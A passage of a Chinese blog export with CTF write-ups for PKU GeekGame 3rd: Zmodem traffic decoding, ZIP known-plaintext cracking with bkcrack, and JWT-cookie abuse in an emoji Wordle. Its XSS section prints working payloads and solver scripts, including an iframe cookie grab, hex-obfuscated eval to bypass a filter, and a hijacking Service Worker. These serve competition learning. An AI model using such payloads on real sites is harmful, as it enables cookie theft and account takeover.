搜到**[Xiaomi_Kernel_OpenSource](https://github.com/MiCode/Xiaomi_Kernel_OpenSource)**，然后在里面找到了Redmi K60 Ultra的[源码](https://github.com/MiCode/Xiaomi_Kernel_OpenSource/tree/corot-t-oss)，进入源码，找到[Makefile](https://github.com/MiCode/Xiaomi_Kernel_OpenSource/blob/corot-t-oss/Makefile)，前几行的数字5、15、78组合即为内核版本号: 5.15.78\n3. Google搜索apple watch series 8(Cellular,41mm) \"identifier\"，[第一条](https://everymac.com/systems/apple/apple-watch/specs/apple-watch-series-8-gps-cellular-41mm-us-canada-a2772.html)就能找到: Watch6,16\n4. 翻gs-backend的GitHub源码，找到[此文件](https://github.com/PKU-GeekGame/gs-backend/blob/master/src/store/user_profile_store.py#L64)，注意到此文件最近一次提交（截止做题时）在2023年10月1日之前，故直接把里面关键代码运行一下即可。不过一开始我并没有注意Python版本的问题，用的我自己环境的Python3.7，导致提交了好几次4401，最后在工作人员放出提示之后才顿然醒悟。\n5. 做过好几次这种要找网站历史快照的题了，因此很快想到去[Wayback Machine](https://web.archive.org/)上找。不过这里需要注意一点，即2011年1月的时候，B站的域名还是bilibili.us。答案: 游戏视频,游戏攻略·解说,Mugen,flash游戏 (怪不得答案格式里会有个莫名其妙的点)\n6. 把照片塞入Google Lens，截取建筑左边一半区域进行搜索，直接得到建筑名：卢森堡音乐厅。然后顺理成章搜到网站：www.philharmonie.lu。不过一开始我没注意答案格式，直接把这个带二级域名的域名提交上去了（x 正确答案：philharmonie.lu\n\n## Z 公司的服务器\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\nZ 公司有很多服务器。出于安全考虑，这些服务器不能直接通过 SSH 登录，需要经过层层跳板，传输文件很不方便。\n\n\n但是有一种古老的方法可以拿到服务器上的文件。这究竟是什么方法呢？\n\n\n同时，黑客还拿到了一段这个服务器的流量。连接到服务器即可用这种方法接收 Flag 1，流量包中记录了用这种方法接收到的 Flag 2。\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-3rd/raw/master/official_writeup/prob05-zserver/attachment/prob05.pcapng)\n\n{% endnote %}\n{% endhideToggle %}\n### 服务器\n\n\n打开网页终端，拿到一串奇怪的东西：`�\\*B00000000000000`\n\n\n直接拿去搜了一下，搜到一些rz、sz的东西。再搜，发现是Zmodem协议。那么这题只要找一个支持Zmodem协议的终端来连接服务器就好了。然后就搜到了SecureCRT，虽然这玩意是付费软件，但有30天的Free trial！配置一下连接信息（协议选择Raw）然后进行连接，输入token以后敲个回车，结果一直没有反应。。。一通乱按，居然成功接收到了flag.txt。后来多试了几次，发现“发送token后再按<kbd>Ctrl</kbd> + <kbd>Enter</kbd>”就可以接收文件。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/e86c3dd203523abca596c7d56c7b4f21.png)\n后来看别的大佬的题解发现原来我在windows系统上用了好久的MobaXterm也支持Zmodem协议。在WSL里用nc连接一下服务器，输入token后在终端区域右键选择“Receiving file using Z-modem”即可。好家伙，这就卸载SecureCRT。\n\n\n### 流量包\n\n\n这题给了一个pcapng文件，由题可知是前面Zmodem协议的流量。在流量中找到了一些比较大的数据包：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/92ea592a1fd5eda53574cad93a151e01.png)\n并且目标地址都是同一个ip，我将这些数据连起来以后转成字节，在其中找到了一些信息：例如上图第一个长度125的数据包，对应的字节为：`\\*\\x18C\\x18D\\x18@\\x18@\\x18@\\x18@\\xddQ\\xa23flag.jpg\\x18@16096 14505333515 100777 0 1 16096\\x18@\\x18k\\xd6\\x18\\xcb3f\\x11`\n\n\n我们发现这里传的文件应该是flag.jpg，然后在后面的数据中寻找jpg的文件头和尾：ffd8和ffd9，那么中间的一串应该就是整个图片文件了！直接写入字节到文件，打开一看发现图片损坏。。。然后我仔细看了一下文件头的后面几个字节，发现这明显有问题，出现了一堆\\x18这样的字符，意识到可能是协议对文件做了一些修改。于是，找到了Zmodem协议的一个[说明网站](http://wiki.synchro.net/ref:zmodem)。把网站链接甩给ChatGPT让它给我读了一读，然后差不多了解了协议对文件的解码方法。这里还有一篇[知乎文章](https://zhuanlan.zhihu.com/p/579720546)也讲了这个协议的实现。\n\n\n在接收端，大概的解码方法即：如果遇到0x18这个字符，就将其后面那个字符异或0x40后塞入字节串；反之则几乎不需要操作，直接塞入字节串就行了。\n\n\n不过协议本身的实现更加复杂，还得考虑ZCRCE（0x69）、ZCRCW（0x68）等指令，我则做了一个简单的处理：直接把这些指令后面的几个字节全部删掉。\n\n\n最后由于大概没能完美实现协议接收数据的方法，解出来的图片如下：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/3cbf769fddd127dd1410765740dc2b5c.png)\n不过还是能连蒙带猜地读出其中的flag：\n\n\nflag{traFf1c_aNa1y51s_4_ZMODEM}\n\n\n\n以下是我写的解码函数：\n\n\n\n```python\ndef zmodem_decode(data):\n    i = 0\n    decoded_data = []\n    while i < len(data):\n        byte = data[i]\n        if byte != 0x18:\n            decoded_data.append(byte)\n            i += 1\n            continue\n        if byte == 0x18:\n            i += 1\n            next_byte = data[i]\n            if next_byte & 0x60 == 0x40:\n                decoded_byte = next_byte ^ 0x40\n                decoded_data.append(decoded_byte)\n            else:\n                if next_byte == 0x69:\n                    i += 4\n                ...\n        i += 1\n    return bytes(decoded_data)\n```\n\n比赛结束后又研究了一下，发现原来1869或者1868后面跟的东西也有可能被0x18转译。。。这样的话就可能会跳过不止4个字节了，怪不得解码出的图片大小比数据包告诉我的文件大小要略大一点。。下面是我修改后的解码函数：\n\n\n\n```python\ndef zmodem_decode(data):\n    i = 0\n    decoded_data = []\n    while i < len(data):\n        byte = data[i]\n        if byte != 0x18:\n            decoded_data.append(byte)\n            i += 1\n        elif i + 1 < len(data):\n            i += 1\n            next_byte = data[i]\n            if next_byte == 0x69:\n                i += 1\n                for _ in range(4):\n                    if data[i] == 0x18:\n                        i += 2\n                    else:\n                        i += 1\n            else:\n                decoded_byte = next_byte ^ 0x40\n                decoded_data.append(decoded_byte)\n                i += 1\n\n    return bytes(decoded_data)\n```\n\n这个函数就可以解出一张非常清晰的图片了：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/9e0eb4bcf90f40a5bf39d222c78f662f.png)\n## 基本功\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n在我们嘿客界，有四种基本功要练。知道是哪四种吗？\n\n\n我知道：说、学、逗、唱。\n\n\n不对。在我们 GeekGame 是 Misc、Web、Binary、Algorithm。不同的地方说法不一样，比如在别的比赛里，Algorithm 可能叫 Crypto。\n\n\n确实，也可能叫 Math。\n\n\n那我们先来说说 Misc 吧。Misc 是基本中的基本，代表所有老赛棍都要掌握的技能。\n\n\n那万一我不掌握，岂不是比赛就爆了，电脑也爆了，○○也爆了？\n\n\n很佩服你有如此觉悟，正因如此我们要多多练习。你觉得作为嘿客，最应该练习什么技能？\n\n\n我觉得是盗 QQ 号，还有破解密码。\n\n\n盗 QQ 号不行，万一腾讯以后会赞助呢。上届比赛黑了一下某品牌，这届就来赞助了，怪尴尬的。破解密码倒是有很多说法。\n\n\n对，我就擅长搞这个。比如你的笔记本电脑，我用五秒钟就能破解登录密码。信不信？\n\n\n不信。你来试试。\n\n\n好，这个指纹传感器，麻烦按一下。谢谢。\n\n\n不不不，破解密码不是这么玩的。看见我电脑里这两个压缩包了吗，我随便用了个密码给它加密了。也不算太长，但至少有 50 个字节，可能会有大小写字母和特殊符号。当然我不会告诉你密码是什么。试试看能不能破解？\n\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-3rd/raw/master/official_writeup/prob24-password/attachment/prob24.zip)\n\n{% endnote %}\n{% endhideToggle %}\n### 简单的 Flag\n\n\n拿到zip文件，先看了一下是不是伪加密，结果发现两个都不是。口令很长，也不可能爆破求解。\n\n\n经搜索，发现原来还有一种方法叫明文攻击，利用每个zip包中的文件都是用同一个密钥进行对称加密的特点。只要知道某个不小于12字节的文件的明文内容，就可以解出加密用的密钥，从而解出压缩包里的其他文件。更进一步地，如果知道某个文件中的12个字节的明文且至少有8个字节连续，那么也可以通过明文攻击解出密钥。\n\n\n有了以上了解，对于第一个flag，我们从网上下载到[89.0.4389.23/chromedriver_linux64.zip](https://chromedriver.storage.googleapis.com/89.0.4389.23/chromedriver_linux64.zip)这个文件，然后用现成的工具进行明文攻击。这里我用的工具是ARCHPR。\n\n\nflag{INSECURE_ZIP_CRYPTO_FROM_SOME_KNOWN_FILE_CONTENT}\n\n### 冷酷的 Flag\n\n\n我万万没想到两个题都是用明文攻击来做的（不过也可以理解，毕竟明文攻击也有“进阶版”），这题的压缩包里面只有一个文件：flag2.pcapng。但通过查资料，可以发现pcapng文件的头部拥有一些比较固定的信息：\n\n![](https://oss.fyz666.xyz/blogfiles/png/3db3b9b801b35128676b823cbb00acfd.png)\n从第7个字节开始，一直到下一行的这些ffff，都是固定不变的，这些连续字节的长度为18，已经够了。因此我们将这些字节写入一个pcap_plain的文件，用它作为明文来解密钥。\n\n\n前面的ARCHPR似乎不支持这种明文攻击？于是我找了另一个工具来解此题：[bkcrack](https://github.com/kimci86/bkcrack)。命令如下：\n\n\n\n```bash\nbkcrack -C challenge_2.zip -c flag2.pcapng -o 6 -p pcap_plain\n```\n\n这里需要通过-o参数指定明文在文件中的偏移量，本例为6。经过20秒左右，得到：\n\n\n\n```bash\nbkcrack 1.5.0 - 2022-07-07\n[21:41:47] Z reduction using 10 bytes of known plaintext\n100.0 % (10 / 10)\n[21:41:48] Attack on 695756 Z values at index 13\nKeys: 54268f9e c35359b0 84f5bded\n3.7 % (25743 / 695756)\n[21:42:13] Keys\n54268f9e c35359b0 84f5bded\n```\n\n解出了三个密钥，接下来通过密钥来解压文件：\n\n```bash\nbkcrack -C challenge_2.zip -k 54268f9e c35359b0 84f5bded -c flag2.pcapng -d flag2.pcapng\n```\n\n顺利拿到流量包。将其用wireshark打开，也懒得去分析流量了，直接试了一下导出HTTP对象，喜提flag2：\n\n![](https://oss.fyz666.xyz/blogfiles/png/55a61cbc4b89cdf69f7f01ecd8b98713.png)\nflag{inSecUrE-zIp-cRYptO-eVeN-wIthOuT-KNOWN-fiLe-CoNtENt}\n\n## Emoji Wordle\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n⬛⬛🟨⬛⬛\n\n\n⬛⬛🟨⬛🟩\n\n\n🟨⬛🟨🟩🟩\n\n\n🟩🟩⬛🟩🟩\n\n\n🤡🤡🤡🤡🤡\n\n\n你能在规定的次数之内猜出由 64 个 Emoji 组成的 Wordle 吗？猜测结果正确就能拿到 Flag。\n\n\n补充说明：\n\n\nLevel 1 的答案是固定的；Level 2 和 3 的答案是随机生成并存储在会话中的。  \n\n此题属于 Web 而非 Algorithm。解出此题无需知道答案的生成算法。\n\n{% endnote %}\n{% endhideToggle %}\n以前玩过这种[Wordle游戏](https://en.wikipedia.org/wiki/Wordle)，游戏规则大概让是玩家猜一个给定长度的单词，如果玩家猜的与答案在某个位置的字母是相同的，就在该位置给出绿色；如果猜到了某个字母，但位置错误，则在该位置给出黄色；如果答案没有出现某个字母，则在该位置给出红色（或者灰色）。\n\n\n这题就是让猜一个长度为64的由emoji组成的“单词”🤡🤡🤡\n\n\n### Level1\n\n\n由补充说明，Level1的答案是固定的，那相当于我们有无限次机会可以猜，这就好办了，我们可以先随机猜，然后记录下返回黄色或绿色的位置的emoji，存在一个集合里，等这个集合差不多固定下来了，再对集合里每个emoji，复制64次发送给服务器，看每个emoji亮了哪些绿块就行。我写的脚本如下：\n\n```python\nimport requests\nimport re\nimport tqdm\n\nurl = 'https://prob14.geekgame.pku.edu.cn/level1'\nexist = set()\nr = requests.get(url).text\nguess = re.search(r'placeholder=\\\"(.*)\\\"', r).groups()[0]\nans = {i: None for i in range(64)}\ntry:\n    while 1:\n        params = {'guess': guess}\n        r = requests.get(url, params=params).text\n        res = re.search(r'results\\.push\\(\\\"(.*)\\\"\\)', r).groups()[0]\n        for i in range(64):\n            if res[i] == '🟨':\n                print('🟨', guess[i])\n                exist.add(guess[i])\n            elif res[i] == '🟩':\n                print('🟩', guess[i])\n                exist.add(guess[i])\n        print(len(exist))\n        guess = re.search(r'placeholder=\\\"(.*)\\\"', r).groups()[0]\nexcept KeyboardInterrupt:\n    print(\"Break\")\n\nfor item in tqdm.tqdm(exist):\n    guess = item * 64\n    params = {'guess': guess}\n    r = requests.get(url, params=params).text\n    res = re.search(r'results\\.push\\(\\\"(.*)\\\"\\)', r).groups()[0]\n    for i in range(64):\n        if res[i] == '🟩':\n            ans[i] = item\n\nr = requests.get(url, params={'guess': ''.join(ans.values())}).text\nprint(re.findall(r'flag{.*}', r)[0])\n\n```\n\nflag{s1Mp1e_brut3f0rc3}\n\n\n\n### Level2\n\n\nLevel2和Level3是第二阶段才做的，说起来本来这题我不需要看提示就能解，但当时做了Level1以后被别的题吸引去了，结果后来就一直在做binary，忘了这还有两个题没做。。。\n\n\n这种Web题拿到就会去看网络请求头，看能不能挖出点啥，然后看到Level2的Cookie非常奇怪：\n\n![](https://oss.fyz666.xyz/blogfiles/png/0011b5add349e2eb962649e196133a23.png)\n搜了一下PLAY_SESSION，搜到一个[Play Framework的网站](https://www.playframework.com/documentation/2.8.x/SettingsSession)，里面说明了这串字符串是通过 [JSON Web Token](https://tools.ietf.org/html/rfc7519)编码的。于是随便找了一个JWT在线解码：\n\n![](https://oss.fyz666.xyz/blogfiles/png/73afeacba5f3bbdc47aa949d5762968f.png)\nflag{d3c0d1n9_jwT_15_345y}\n\n这样看第二题解起来似乎比第一题还快（x\n\n\n### Level3\n\n\n第三题的Cookie就要短很多了，也少了上一题那种有明显规律的字符，不过既然解上一题时查到了JWT，那么也拿来解密一下看看有哪些内容：\n\n![](https://oss.fyz666.xyz/blogfiles/png/bf9fdb9d6ad46bb9d84012fe95f6393e.png)\n诶，发现有一个神奇的seed，以及剩余的猜测次数。看到seed就想起随机数，可能和题目答案有关，那我如果每次都带着同一个cookie去猜，会不会答案和剩余次数都不会发生变化呢？带着这个猜测我去试了一下，发现果然如此。\n\n\n那么这题就和第一题没啥区别了，把第一题的代码改改直接用：\n\n```python\nimport requests\nimport re\nimport tqdm\n\nurl = 'https://prob14.geekgame.pku.edu.cn/level3'\nexist = set()\nsession = requests.session()\nr = session.get(url)\nheaders = {'Cookie': '='.join(session.cookies.items()[0])}\nguess = re.search(r'placeholder=\\\"(.*)\\\"', r.text).groups()[0]\nans = {i: None for i in range(64)}\ntry:\n    while 1:\n        params = {'guess': guess}\n        r = requests.get(url, params=params, headers=headers).text\n        res = re.search(r'results\\.push\\(\\\"(.*)\\\"\\)', r).groups()[0]\n        for i in range(64):\n            if res[i] == '🟨':\n                print('🟨', guess[i])\n                exist.add(guess[i])\n            elif res[i] == '🟩':\n                print('🟩', guess[i])\n                exist.add(guess[i])\n        print(len(exist))\n        guess = re.search(r'placeholder=\\\"(.*)\\\"', r).groups()[0]\nexcept KeyboardInterrupt:\n    print(\"Break\")\n\n\nfor item in tqdm.tqdm(exist):\n    guess = item * 64\n    params = {'guess': guess}\n    r = requests.get(url, params=params, headers=headers).text\n    res = re.search(r'results\\.push\\(\\\"(.*)\\\"\\)', r).groups()[0]\n    for i in range(64):\n        if res[i] == '🟩':\n            ans[i] = item\n\nr = requests.get(url, params={'guess': ''.join(ans.values())}, headers=headers).text\nprint(re.findall(r'flag{.*}', r)[0])\n\n```\n\nflag{StateIess_game_IS_a_b4d_1d3a}\n\n## 第三新XSS\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n第三新兆京大学的第三新学院坐落在美丽的第三新燕园校区。在这里工作的第三新学生在欣赏第三新燕园校区的第三新风光之余，还组建起了第三新实验室，努力发展解决卡脖子难题的第三新技术。\n\n\n就像其他世界一流大学一样，第三新学院也有自己的第三新官网，每个第三新学生可以向第三新教务提出申请，在上面放置自己的第三新个人主页。在第三新教务座谈会上，有人提出了质疑：\n\n\n> “允许任何人在官网上设置个人主页，请问这是否存在安全漏洞？比如，能否通过 XSS 漏洞篡改他人的主页内容。”\n> \n> \n> “暂时不能给你明确的答复。不过有一点可以保证，这套系统从根本上杜绝了 XSS 漏洞，因为所有人共享同一个网站，Cross-Site 不了一点。”\n> \n> \n> “好的，这套系统没有 XSS 漏洞。那么是否有第三新 XSS 漏洞呢？”\n> \n> \n> “这个问题需要你自己去衡量。”\n\n\n此时人们尚未意识到，命运的第三新齿轮即将开始转动……\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-3rd/raw/master/official_writeup/prob01-homepage/attachment/prob01-src.zip)\n\n{% endnote %}\n{% endhideToggle %}\n以前做这种XSS的题从来没成功过，这次看了二阶段的提示，学到了不少东西，还顺便把这两个小题全解出来了，也是非常舒服。\n\n### 巡猎\n\n\n{% hideBlock 二阶段提示 %}\n> 给 Cookie 设置 Path 并不能带来安全性。[MDN 文档](https://developer.mozilla.org/en-US/docs/web/api/document/cookie#security) 专门有一节来指出其中的问题。\n{% endhideBlock %}\n\n首先看了一下题目给的xssbot.py，对于第一个flag，用户的行为是：\n\n\n1. 访问/admin网页，将flag1放置在cookie里，并设置cookie的path为/admin\n2. 访问我们给他的链接（必须是http协议）\n\n然后，程序为我们打印出用户所在网页的title。\n\n\n经2阶段提示，我去看了一下MDN文档，发现在页面里嵌套一个src为/admin的iframe，就可以在当前页面读取到/admin路径下的cookie。\n\n\n于是，我们可以创建一个页面，在页面里搞一个这样的iframe，然后再加一段js脚本来获取iframe里的cookie，并将标题设为它：\n\n```markup\n<iframe id=\"myiframe\" src=\"/admin\" style=\"display:none;\"></iframe>\n<script>\n    document.getElementById('myiframe').onload = function() {\n        var iframe = document.getElementById('myiframe');\n        document.title = iframe.contentDocument.cookie;\n    }\n</script>\n```\n\n但直接上传这段内容，会被服务器以403拒绝。似乎是通过某种方法过滤了一些脚本内容。不过我们可以将一部分脚本内容转成16进制码，然后用window.eval来执行，这样就能通过了：\n\n```js\ndocument.getElementById('myiframe').onload = function() {\n window.eval('\\x76\\x61\\x72\\x20\\x69\\x66\\x72\\x61\\x6d\\x65\\x20\\x3d\\x20\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x67\\x65\\x74\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x42\\x79\\x49\\x64\\x28\\x27\\x6d\\x79\\x69\\x66\\x72\\x61\\x6d\\x65\\x27\\x29\\x3b\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x74\\x69\\x74\\x6c\\x65\\x20\\x3d\\x20\\x69\\x66\\x72\\x61\\x6d\\x65\\x2e\\x63\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x44\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x63\\x6f\\x6f\\x6b\\x69\\x65\\x3b')\n}\n```\n\n我也写了个脚本来记录自己的操作：\n\n```python\nimport requests\nfrom pwn import *\n\nurl = 'https://prob99-m63o7gly.geekgame.pku.edu.cn/'\n\njs_code = \"\"\"var iframe = document.getElementById('myiframe');document.title = iframe.contentDocument.cookie;\"\"\"\n\njs_code = ''.join(map(lambda x: '\\\\x' + hex(ord(x))[2:], js_code))\ninject = \"\"\"<iframe id=\"myiframe\" src=\"/admin\" style=\"display:none;\"></iframe><script>document.getElementById('myiframe').onload = function() {window.eval('%s');}</script>\"\"\" % js_code\nrequests.post(url, data={'name': '1', 'header': '{\"Content-Type\": \"text/html\"}', 'body': inject})\n\nr = remote('prob01.geekgame.pku.edu.cn', 10001)\nr.recvuntil(b'token:')\nr.sendline(b'YOUR_TOKEN_HERE')\nprint(r.recvuntil(b'Your blog URL: ').decode())\nr.sendline((url.replace('https', 'http') + '1/').encode())\ntry:\n    while 1:\n        print(r.recv().decode())\nexcept EOFError:\n    ...\n\n```\n\nflag{tOtALLY-NO-sECuRItY-In-The-sAMe-oRIgiN}\n\n### 记忆\n\n\n{% hideBlock 二阶段提示 %}\n> 你需要 [注册一个 Service Worker](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers)，而且要注册到 `\"/\"` 这个 scope 上。\n{% endhideBlock %}\n\n这是道本次比赛让我收获比较大的小题。\n\n\n了解到Service Worker是一种运行在后台的JavaScript脚本，可以实现许多功能，包括“控制网络请求的处理，比如自定义响应等”。\n\n\n对于第二个flag，用户的行为如下：\n\n\n1. 访问我们给他的链接（必须是https协议）\n2. 访问/admin网页，并在半秒之后将cookie设为flag，并设置cookie的path为/admin\n\n由于是先访问我们的链接，再访问/admin，之前的方法就行不通了（不过就算顺序反一下好像也不行，因为iframe好像会强行把src的https改成http，然后会因为不同源的问题被禁止加载）\n\n\n那么思路就是，通过我们提供的链接，给用户植入一个Service Worker脚本，这个脚本要能在用户访问/admin时劫持请求，然后把cookie设置到title上。\n\n\n由于Service Worker有非常严格的限制，比如只能在https网站上注册来自同源站点的脚本等，所以我们首先需要想办法上传一个脚本到服务器上去。（不知道为什么当时这一步卡了很久，这服务端不明摆着的有一个上传接口吗？）当然我还查到一些通过jsonp来绕过同源限制的例子，不过这题明显不支持jsonp。\n\n\n为了做这道题，只需要学一点点的Service Worker语法，写一个最小工作示例差不多就够了：\n\n```js\nself.addEventListener('fetch', function(event) {\n    event.respondWith(\n        new Response('<script>setTimeout(()=>{document.title = document.cookie;}, 1000);</script>',\n            {headers: {'Content-Type':'text/html'}}\n        )\n    )\n});\n```\n\n考虑到用户在访问/admin网站半秒后才设置flag，我们就延迟1秒再设置title。\n\n\n将上面的脚本内容作为Body，注意到我们居然甚至还能修改Response Header，那就直接将Header设置为下面的内容：\n\n```json\n{\n    \"Content-Type\": \"text/javascript\"\n}\n```\n\n，这样，我们注册的第一个个人主页就能假装自己是一个JavaScript脚本文件了，我们将这个网页的用户名注册为sw。\n\n\n接下来，我们注册第二个个人主页，用以让用户访问，在这个主页上给用户植入前面的那个脚本。与第一个flag类似，可以采用下面的方法：\n\n```markup\n<script>navigator.serviceWorker.register('/sw/', {'scope': '/'});</script>\n```\n\n并且将代码转成16进制来执行：\n\n```markup\n<script>window.eval('\\x6e\\x61\\x76\\x69\\x67\\x61\\x74\\x6f\\x72\\x2e\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x57\\x6f\\x72\\x6b\\x65\\x72\\x2e\\x72\\x65\\x67\\x69\\x73\\x74\\x65\\x72\\x28\\x27\\x2f\\x73\\x77\\x2f\\x27\\x2c\\x20\\x7b\\x27\\x73\\x63\\x6f\\x70\\x65\\x27\\x3a\\x20\\x27\\x2f\\x27\\x7d\\x29\\x3b')</script>\n```\n\n这就是第二个个人主页的内容。\n\n\n然后让用户访问第二个个人主页，等待数秒，结果却失败了。。。Service Worker好像并没有像我想的那样工作。\n\n\n于是我自己在浏览器里访问了一下第二个个人主页，结果发现浏览器控制台有条报错：\n\n\n`The path of the provided scope ('/') is not under the max scope allowed ('/sw/'). Adjust the scope, move the Service Worker script, or use the Service-Worker-Allowed HTTP header to allow the scope.`\n\n\n原来是不让我注册到根目录下，了解了一下发现原来Service Worker默认只能注册在脚本文件所在目录的scope（或者更内层的scope）下，而不能在所在目录外层的scope注册，这里浏览器认为我的脚本在'/sw'路径下，因此不让我注册到scope: '/'。但好在我仔细看了一眼报错内容，它除了让我修改注册scope、移动脚本以外，居然还有第三个选项，那就是使用一个响应头字段：`Service-Worker-Allowed`来告诉浏览器允许注册这个脚本到哪些scope下。那就简单了，我们不正好可以随便改响应头吗，加一条`\"Service-Worker-Allowed\": \"/\"`就行了。\n\n\n加上这条响应头试了一下，果然成功了。解题脚本如下：\n\n```python\nimport requests\nfrom pwn import *\n\nurl = 'https://prob99-m63o7gly.geekgame.pku.edu.cn/'\n\nsw_script = \"\"\"self.addEventListener('fetch', function(event) {\n    event.respondWith(\n        new Response('<script>setTimeout(()=>{document.title = document.cookie;}, 1000);</script>',\n            {headers: {'Content-Type':'text/html'}}\n        )\n    )\n});\"\"\"\nrequests.post(url, data={'name': 'sw', 'header': '{\"Content-Type\": \"text/javascript\", \"Service-Worker-Allowed\": \"/\"}', 'body': sw_script})\n\njs_code = \"\"\"navigator.serviceWorker.register('/sw/', {'scope': '/'});\"\"\"\n\njs_code = ''.join(map(lambda x: '\\\\x' + hex(ord(x))[2:], js_code))\ninject = \"\"\"<script>window.eval('%s')</script>\"\"\" % js_code\nrequests.post(url, data={'name': '2', 'header': '{\"Content-Type\": \"text/html\"}', 'body': inject})\n\nr = remote('prob01.geekgame.pku.edu.cn', 10001)\nr.recvuntil(b'token:')\nr.sendline(b'YOUR_TOKEN_HERE')\nprint(r.recvuntil(b'Your blog URL: ').decode())\nr.sendline((url + '2/').encode())\ntry:\n    while 1:\n        print(r.recv().decode())\nexcept EOFError:\n    ...\n\n```\n\nflag{peRSiSTeNt-XSS-aTTACK-UsiNG-SERvIce-woRkER}\n\n不得不说这个Service Worker结合XSS漏洞是真的厉害。。。\n","tags":["GeekGame","GeekGame 3rd"],"categories":["CTF题解"]},{"title":"PKU GeekGame 3rd题解（零）","url":"//blog/8565/","content":"\n在科研的压力下，一年一度的GeekGame成了一个消遣放松的绝好借口~~不过为什么感觉打这个比赛比搞科研更累？~~。\n\n今年的比赛顺利取得总排名36/1012（通过签到题的人数），并且在一周的比赛时间内又学到了不少~~一年前可能学过但又忘了的~~东西，算是非常有收获。按老规矩，继续写篇题解记录一下本菜狗的解题过程。\n\n![](https://oss.fyz666.xyz/blogfiles/png/30bd5c8f05833f44452c5a3604cfacae.png)\n\n\n{% link 本次比赛的官方存档,GitHub,https://github.com/PKU-GeekGame/geekgame-3rd %}\n\n## 题解\n\n\n- [PKU GeekGame 3rd题解（一）](/blog/8499/)  \n\n一眼盯帧、小北问答!!!!!、Z 公司的服务器、基本功、Emoji Wordle、第三新XSS\n- [PKU GeekGame 3rd题解（二）](/blog/8527/)  \n\n简单的打字稿（Super Easy）、汉化绿色版免费下载、初学 C 语言（Flag 1）、绝妙的多项式、关键词过滤喵，谢谢喵（字数统计喵）、小章鱼的曲奇、华维码（华维码 · 特难）\n\n## 总结\n\n\n本次比赛比去年学到了更多的内容，个人最大的突破在于binary类型的题，曾经我的binary只能拿0分，而这次竟如打通任督二脉一般做了800多分，不过细究原因，还是这次的binary题混入了两道假binary罢了。栈溢出那题，虽然做了半天还是溢出不了一点，但在过程中掌握了gdb的基本调试命令，也算是一种收获。\n\n\nWeb方面，首次做出了XSS的题，值得纪念（虽然是经过二阶段的提示），这道题也带给了我非常多的收获。\n\n\n不过有一些需要吐槽的地方：\n\n\n## 吐槽\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/gif/c2b9835ab42600e2f859124d34935bf1.gif)\n有一些体验不好的题：\n\n\n- **麦恩·库拉夫特**\n\n是个MineCraft游戏，至少解出一个flag的人比较多。但对没玩过这个游戏的选手很不友好，例如：有玩过MC的参赛选手认为只要是老玩家，一下就能猜到第一个flag在哪；还有熟练选手连游戏都没开就直接用脚本跑出flag的。由于我从来没有玩过这个游戏，这道题需要从头开始配游戏运行环境（包括服务端和客户端），不仅如此，打开游戏后，还得对着游戏教程熟悉各种最基本的操作，非常麻烦；另外我还晕3d，好不容易配好了环境，进去玩五分钟就晕了。关于晕3d这一点，有人说可以用脚本刷，然而我连游戏怎么玩都不知道，就让我去学习用脚本是不是过分了；还有人提出可以切换为第三视角，我后来试了一下，发现没什么用，和我以前玩过的第三视角游戏不大一样，人物还忽大忽小，还是很晕。另外为了解个题去入门一个我不想玩的游戏也是非常不划算的事。。总之这是道让我个人体验比较差的题。\n\n\n- 扫雷\n\n这题的体验差主要在于地图太大和响应太慢。然后前期还需要不停地试错来找规律（结合前面两点就会很头大）导致看了一段时间就不想看了。题目本身大概还是很有意思的。\n\n\n- 华维码\n\n正如我在[题解](/blog/8527/)里提到的，这道题的第一小题如果一开始就把题目的素材下载下来，会下载到以数字为文件名的图片文件，将它们按数字顺序进行排列，就可以直接得到二维码，扫二维码就能拿第一个flag；那么第二小题大概也是类似。比赛结束后发现第二小题的二维码无法直接扫出flag，但这个bug至少能让选手快速确定每个块的位置，去玩华容道也省事了一大半）\n\n\n后来实锤确实有这个问题：[prob19-qrcode#非预期解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob19-qrcode#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3)，面对如此重大的bug，组委会的处理方案居然是当无事发生，直接默默修了bug也没发任何通知，让一开始就下载完题目素材的选手和后面才下载的选手处于完全不同的起跑线，解题难度差了十万八千里，有失公平性。\n\n\n我认为合理的处理方法应该是像前面随机数那题一样不改，毕竟：“这不是bug，这是feature”；或是取消所有解出该题的选手这一题的得分（我自己也靠这个bug做了一小题，然而我当时真的以为这是个feature），等把bug修复了重新生成新的二维码后再重新上线。\n\n\n可能有人会问为什么我不认为随机数那题（同样因为出题人的不慎，出现了非常简单的非预期解）体验不好，是不是因为我解出来了，所以双标。其实不是的，这两题组委会的处理方法完全不同，随机数那题，组委会并没有默默修改题目，而是在二阶段大方承认存在非常简单的非预期解，这是可以接受甚至非常合理的操作。\n\n\n\n\n---\n\n总体而言，这次比赛收获颇丰，体验不错，明年一定还参加，希望GeekGame越办越好！\n","tags":["GeekGame","GeekGame 3rd"],"categories":["CTF题解"]},{"title":"从零开始的麻将AI论文复现（二）","url":"//blog/8472/","content":"\n本来想省略掉所有麻将游戏的实现细节的，但后来发现强化学习算法需要一个游戏环境，因此完整实现一整套麻将游戏的流程也属于论文复现的一部分，还是有必要对游戏实现时遇到的一些技术细节进行解释。\n\n## 如何判定和牌\n\n\n立直麻将共有三种和牌形，分别是：\n\n\n- 面子手：m \\* AAA + (4-m) \\* ABC + DD\n- 七对：7个**互不相同**的对子\n- 